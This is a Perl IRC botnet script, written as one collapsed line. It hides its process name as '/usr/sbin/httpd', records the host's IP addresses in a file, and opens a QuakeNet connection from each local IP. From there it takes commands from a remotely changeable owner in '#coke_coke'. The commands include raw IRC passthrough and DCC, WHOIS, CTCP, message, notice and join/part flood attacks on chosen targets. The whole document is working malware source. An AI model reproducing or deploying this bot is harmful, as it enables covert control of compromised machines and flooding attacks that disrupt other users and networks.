#!/usr/bin/perl######################my @servers = ("irc.quakenet.org","demon.uk.quakenet.org","uk.quakenet.org","irc.byroe.net");my $server  = $servers[rand scalar @servers];my @ports   = ("6667");my $port    = $ports[rand scalar @ports];my $channel = "#coke_coke";my $owner   = "coke";my $procname= "/usr/sbin/httpd";######################my @nickname = ("q","w","r","t","y","p","s","d","g","h","j","k","l","z","x","v","b","n","m","e","y","u","i","o","a");my @realname  = irc_nick();my @WHO;my $qqum="*";$ARGC=@ARGV;$SIG{CHLD} = sub { wait }; # alterando o signalmy $qtip = qx(/sbin/ifconfig |grep inet | wc -l);my @ips1 =qx(/sbin/ifconfig |grep \"inet addr\:\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c6\-);my @ips2 =qx(/sbin/ifconfig \-a |grep \"inet end\.\:\" \|awk \-F \' \' \'\{\print \$3\} \');my @fbsd =qx(/sbin/ifconfig \|grep \"inet\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c1\-);@ips = (@ips1, @ips2, @fbsd);open(ipzitcho,">ips.txt") || die "- ips.txt not found";          print ipzitcho" @ips";          close(ipzitcho);@ips = grep { s/\n$// } @ips;$0 =  $procname  . "\0";$nick2 = $nick;print STDOUT "\n+ user\n";print STDOUT "+ Server : $server\n";print STDOUT "+ Port   : $port\n";print STDOUT "+ Owner  : $owner\n";print STDOUT "+ Channel: $channel\n";print STDOUT "+ IPs    : $qtip\n\n";use IO::Socket;foreach my $FROM (@ips) { my $pid = fork(); # gerando um novo processo  unless ($pid) {   #my $ident= irc_nick();my $nick = irc_nick();my $name = irc_nick();$sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();   print $sock "NICK ".$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname]."\n";   print $sock "USER $ident $FROM $server :".$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname]."\n";while (<$sock>) {$ident= irc_nick();$nick = irc_nick();$name = irc_nick();        if (/^:.+?\s433\s/) { # nick already in use            $nick2 = irc_nick();            print $sock "NICK ".$nick2."\n";        }        if (/^:.+?\s376\s/) { # end of motd            print $sock "JOIN $channel\n";        }        if(/^PING :(.*)/){ #replying the ping            print $sock "PONG :$1\n";        }        if(/^\:$owner!.*\@.*PRIVMSG.*:.bot (.*)/){            print $sock "$1";        }      if(/^\:$owner!.*\@.*PRIVMSG.*:.msg(.*)/){                        print $sock "PRIVMSG ".$1." : ".$2."\n";      }      if(/^\:$owner!.*\@.*PRIVMSG.*:.who(.*)/){                        print $sock "who ".$channel."\n";      }      if (/^:.+?\s+352\s+\S+\s+\S+\s+(.+?)$/) {                        my $nicks = $1;                        #$nicks =~ s/\n//;                        #$nicks =~ s/\r//;                        push(@WHO, split(/ /, $nicks));                        print STDOUT "$who[1]\n";      }      if(/^\:$owner!.*\@.*PRIVMSG.*:.dccflood(.*)/){                        for (1 .. 5) {                        print $sock "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n";                        }      }      if(/^\:$owner!.*\@.*PRIVMSG.*:.whoisflood(.*)/){                        for (1 .. 5) {                        print $sock "whois ".$1."\n";                        }      }      if(/^\:$owner!.*\@.*PRIVMSG.*:.hop (.*)/){                print $sock "JOIN ".$1." : ".$2."\n";                        for (1 .. 5) {                        print $sock "PART ".$1." : ".$2."\n";                        print $sock "JOIN ".$1." : ".$2."\n";                        }      }          if(/^\:$owner!.*\@.*PRIVMSG.*:.ctcpflood(.*)/){                print $sock "PRIVMSG ".$1." :\001VERSION\001\n";                        for (1 .. 5) {                        print $sock "PRIVMSG ".$1." :\001VERSION\001\n";                        print $sock "PRIVMSG ".$1." :\001PING\001\n";                        }      }          if(/^\:$owner!.*\@.*PRIVMSG.*:.msgflood(.*)/){                        for (1 .. 5) {                        print $sock "PRIVMSG ".$1." :4susumu cilikkkkkkkkk\n";                        }      }          if(/^\:$owner!.*\@.*PRIVMSG.*:.noticeflood(.*)/){                        for (1 .. 5) {                        print $sock "NOTICE ".$1." :4susumu cilikkkkkkkkk\n";                        }      }      if(/^ERROR :(.*)/){                        use IO::Socket;                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();                        print $sock "NICK ".$nick."\n";                        print $sock "USER $ident $FROM $server :$name\n";      }      if(/^\:$owner!.*\@.*PRIVMSG.*:.quit(.*)/){                        die();      }      if(/^\:.*: Connection timed out(.*)/){                        print STDOUT "[~] Connection Timed Out! Retrying!\n";                        use IO::Socket;                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();                        print $sock "NICK ".$nick."\n";                        print $sock "USER $ident $FROM $server :".$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname]."\n";      }      if(/^\:$owner!.*\@.*PRIVMSG.*:.ssmaboyts(.*)/){                        print $sock "PRIVMSG ".$owner." : Bot Ssmaboyts\n";                        print $sock "PRIVMSG ".$owner." : Using server : $server\n";                        print $sock "PRIVMSG ".$owner." : Using port   : $port\n";                        print $sock "PRIVMSG ".$owner." : Using nick   : $nick\n";                        print $sock "PRIVMSG ".$owner." : Using owner  : $owner\n";                        print $sock "PRIVMSG ".$owner." : Using ident  : $id\n";                        print $sock "PRIVMSG ".$owner." : putri-bot\n\n";       }       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:.owner\s+(.*)/ ){                       $owner =$1;                       $owner =~ s/ //;                       $owner =~ s/\r$//;                       $owner =~ s/\n$//;       }   }exit;  } }sub irc_nick { my $crsnics = int(rand(10));if   ($crsnics == 0) { return $nickname[rand scalar @nickname]."[".$nickname[rand scalar @nickname]."]".$nickname[rand scalar @nickname]; }elsif($crsnics == 1) { return $nickname[rand scalar @nickname].int(rand(10)).$nickname[rand scalar @nickname]; }elsif($crsnics == 2) { return $nickname[rand scalar @nickname].int(rand(10)).$nickname[rand scalar @nickname].$nickname[rand scalar @nickname]; }elsif($crsnics == 3) { return $nickname[rand scalar @nickname].$nickname[rand scalar @nickname].int(rand(10)).$nickname[rand scalar @nickname]; }elsif($crsnics == 4) { return $nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname]; }elsif($crsnics == 5) { return $nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].int(rand(10)).$nickname[rand scalar @nickname]; }elsif($crsnics == 6) { return $nickname[rand scalar @nickname].$nickname[rand scalar @nickname]; }elsif($crsnics == 7) { return $nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname]; }elsif($crsnics == 8) { return $nickname[rand scalar @nickname].$nickname[rand scalar @nickname]."[".$nickname[rand scalar @nickname]."]"; }elsif($crsnics == 9) { return $nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname].$nickname[rand scalar @nickname]; }}